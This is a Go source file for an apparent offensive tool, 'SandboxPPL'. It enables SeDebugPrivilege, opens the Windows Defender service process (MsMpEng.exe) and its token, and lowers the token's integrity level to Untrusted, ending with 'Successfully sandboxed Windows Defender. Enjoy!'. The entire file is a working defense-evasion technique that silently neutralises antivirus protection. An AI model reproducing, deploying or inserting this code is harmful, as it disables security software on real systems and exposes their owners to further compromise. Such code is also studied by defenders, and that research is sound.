package main

import (
	"syscall"
	"fmt"
	"unsafe"
	"log"
	"SandboxPPL/structs"
	"SandboxPPL/calls"
	"SandboxPPL/funcs"
)

const (
    STANDARD_RIGHTS_REQUIRED = 0x000F0000
    STANDARD_RIGHTS_READ = 0x00020000
    TOKEN_ASSIGN_PRIMARY = 0x0001
    TOKEN_DUPLICATE = 0x0002
    TOKEN_IMPERSONATE = 0x0004
    TOKEN_QUERY = 0x0008
    TOKEN_QUERY_SOURCE = 0x0010
    TOKEN_ADJUST_PRIVILEGES = 0x0020
    TOKEN_ADJUST_GROUPS = 0x0040
    TOKEN_ADJUST_DEFAULT = 0x0080
    TOKEN_ADJUST_SESSIONID = 0x0100
    TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
    TOKEN_ALL_ACCESS = uint32(STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID)
    PROCESS_ALL_ACCESS = 0x1F0FFF
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    SE_GROUP_INTEGRITY = 0x00000020
    UNTRUSTED = "S-1-16-0"
)

func main() {
	//Making sure SeDebugPrivilege is enabled on the current process
	funcs.EnablePrivilegeOnCurrentProcess("SeDebugPrivilege")
	fmt.Println("[+] SeDebugPrivilege successfully enabled on current process")

	//Get the PID of the Windows Defender service
	defenderpid, err := funcs.GetProcessID("MsMpEng.exe")
	if err != nil {
		log.Fatal(fmt.Println("[!] Target process does not exist"))
	}

	//Open the (PPL) Windows Defender service process using PROCESS_QUERY_LIMITED_INFORMATION
	dHandle, err := syscall.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, defenderpid)
	if err != nil {
		log.Fatal(fmt.Println("[!] Cannot get a handle to the Windows Defender process"))
	}
	fmt.Println("[+] Got a handle to the Windows Defender process")
	
	//Get a handle to the token of the Windows Defender process
	var dTokenHandle syscall.Token
	err = syscall.OpenProcessToken(dHandle, TOKEN_ALL_ACCESS, &dTokenHandle)
	if err != nil {
		log.Fatal(fmt.Println("[!] Cannot get a handle to the Windows Defender process token"))
	}
	fmt.Println("[+] Got a handle to the Windows Defender process token")

	// Set the token integrity to Untrusted
	tml := &structs.TOKEN_MANDATORY_LABEL{}
	tml.Label.Attributes = SE_GROUP_INTEGRITY
	
	UNTRUSTED_UTF16Ptr := funcs.UTF16PtrFromString(UNTRUSTED)
	calls.ConvertStringSidToSid(UNTRUSTED_UTF16Ptr, &tml.Label.Sid)
        tmlSize := uint32(unsafe.Sizeof(tml)) + calls.GetLengthSid(tml.Label.Sid)

	err = calls.SetTokenInformation(dTokenHandle, syscall.TokenIntegrityLevel, uintptr(unsafe.Pointer(tml)), tmlSize)
	if err != nil{
		log.Fatal(fmt.Println("[!] Unable to set the token integrity to Untrusted"))
	}
	fmt.Println("[+] Token integrity set to Untrusted")
	fmt.Println("[+] Successfully sandboxed Windows Defender. Enjoy!")
}
